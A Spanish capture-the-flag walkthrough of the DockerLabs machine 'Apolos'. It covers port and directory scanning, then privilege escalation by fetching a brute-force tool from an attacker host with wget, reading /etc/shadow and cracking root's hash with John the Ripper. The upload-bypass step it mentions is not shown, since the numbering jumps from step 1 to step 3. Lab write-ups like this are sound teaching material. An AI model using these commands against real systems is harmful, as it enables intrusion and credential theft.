## Introducción

Este documento presenta la resolución completa de la máquina **Apolos**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web que permite el registro de usuarios y contiene un panel administrativo con una funcionalidad de subida de archivos. Aunque la extensión `.php` está bloqueada, se descubre que `.phtml` es aceptada, permitiendo la subida de una reverse shell y obteniendo acceso como `www-data`.
Una vez dentro, se realiza un ataque de fuerza bruta local contra el usuario `luisillo_o` utilizando `userRush`, obteniendo acceso a esta cuenta. Este usuario pertenece al grupo `shadow`, lo que permite leer `/etc/shadow` y extraer el hash de `root`. Tras crackearlo con John the Ripper, se obtiene acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Apolos.zip
sudo bash auto_deploy.sh Apolos.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Apolos/{content,exploits,nmap,scripts}
cd Apolos
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763970791/Ports_dojwfy.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Gobuster_bqj2zo.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → luisillo_o

No se encuentran binarios SUID ni permisos sudo útiles. Se realiza un ataque de fuerza bruta local sobre el usuario `luisillo_o` utilizando `userRush`.

En la máquina atacante se levanta un servidor web:

```bash
python3 -m http.server 8000
```

En la máquina víctima se descargan las herramientas:

```bash
wget http://<IP_attacker>:8000/userRush.sh
wget http://<IP_attacker>:8000/rockyou.txt
chmod +x userRush.sh
```

Se ejecuta:

```bash
./userRush.sh -u luisillo_o -d rockyou.txt -t 10
```

![Password](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Password_epy7n0.png)

Se cambia al usuario:

```bash
su luisillo_o
```

![Luisillo](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Luisillo_svqrbk.png)

### 3.2 De luisillo_o → root

El usuario pertenece al grupo **shadow**, permitiendo leer `/etc/shadow`:

```bash
cat /etc/shadow
```

Se extrae el hash de `root` y se crackea con John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/John_tnhoil.png)

Se cambia a root:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763970794/Root_gtipwp.png)
